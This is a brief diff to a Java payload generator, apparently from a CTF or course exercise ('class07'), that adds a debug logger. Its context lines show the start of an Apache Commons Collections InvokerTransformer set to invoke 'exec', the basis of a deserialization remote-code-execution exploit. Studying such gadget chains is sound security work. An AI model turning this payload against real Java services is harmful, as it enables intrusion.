@@ -3,6 +3,7 @@ package class07;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
+import com.ctfstu.common.Logger;
 
 /**
  * 生成 class07 的 payload — InvokerTransformer
@@ -15,6 +16,7 @@ import java.io.ObjectOutputStream;
  */
 public class GenPayload {
     public static void main(String[] args) throws Exception {
+        Logger.setLogLevel(Logger.DEBUG);
         InvokerTransformer trans = new InvokerTransformer(
                 "exec",
                 new Class[]{String.class},
